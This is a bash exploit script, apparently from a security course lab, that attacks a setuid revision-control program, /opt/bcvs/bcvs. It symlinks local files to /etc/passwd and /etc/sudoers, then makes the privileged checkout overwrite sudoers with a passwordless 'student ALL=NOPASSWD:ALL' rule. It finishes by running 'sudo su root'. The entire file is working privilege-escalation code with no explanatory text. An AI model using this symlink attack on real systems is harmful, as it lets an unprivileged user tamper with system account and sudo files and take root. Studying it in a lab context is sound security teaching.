#!/bin/bash


function add_to_passwd() {
  echo $1 >> .bcvs/passwd
}

function add_to_sudoers() {
  echo $1 >> .bcvs/sudoers
}

# Setup environment
mkdir -p sploit3_dir
cd sploit3_dir
mkdir -p .bcvs
touch .bcvs/block.list

rm -f .bcvs/passwd          # In case one already exists
touch .bcvs/passwd          # This will contain our new passwd file contents
ln -sf /etc/passwd passwd

rm -rf .bcvs/sudoers
touch .bcvs/sudoers
ln -sf /etc/sudoers sudoers

# Probably don't need to add everything but I don't want to bother with constantly
# fixing it
add_to_passwd "root:x:0:0:root:/root:/bin/bash"
add_to_passwd "daemon:x:1:1:daemon:/usr/sbin:/bin/sh"
add_to_passwd "bin:x:2:2:bin:/bin:/bin/sh"
add_to_passwd "sys:x:3:3:sys:/dev:/bin/sh"
add_to_passwd "sync:x:4:65534:sync:/bin:/bin/sync"
add_to_passwd "games:x:5:60:games:/usr/games:/bin/sh"
add_to_passwd "man:x:6:12:man:/var/cache/man:/bin/sh"
add_to_passwd "lp:x:7:7:lp:/var/spool/lpd:/bin/sh"
add_to_passwd "mail:x:8:8:mail:/var/mail:/bin/sh"
add_to_passwd "news:x:9:9:news:/var/spool/news:/bin/sh"
add_to_passwd "uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh"
add_to_passwd "proxy:x:13:13:proxy:/bin:/bin/sh"
add_to_passwd "www-data:x:33:33:www-data:/var/www:/bin/sh"
add_to_passwd "backup:x:34:34:backup:/var/backups:/bin/sh"
add_to_passwd "list:x:38:38:Mailing List Manager:/var/list:/bin/sh"
add_to_passwd "irc:x:39:39:ircd:/var/run/ircd:/bin/sh"
add_to_passwd "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh"
add_to_passwd "nobody:x:65534:65534:nobody:/nonexistent:/bin/sh"
add_to_passwd "libuuid:x:100:101::/var/lib/libuuid:/bin/sh"
add_to_passwd "syslog:x:101:103::/home/syslog:/bin/false"
add_to_passwd "sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin"
add_to_passwd "landscape:x:103:108::/var/lib/landscape:/bin/false"
add_to_passwd "student:x:1000:1000:student,,,:/home/student:/bin/bash"
add_to_passwd "messagebus:x:104:112::/var/run/dbus:/bin/false"
add_to_passwd "schu1330:x:1001:1001:,,,:/home/schu1330:/bin/bash"
add_to_passwd "superman:x:1002:1002:,,,:/home/superman:/bin/bash"

add_to_sudoers "student ALL=NOPASSWD:ALL"
add_to_sudoers "%sudo ALL=NOPASSWD:ALL"

#echo "gotcha" | /opt/bcvs/bcvs co passwd
echo "gotcha" | /opt/bcvs/bcvs co sudoers

echo "Logging in as root"
sudo su root
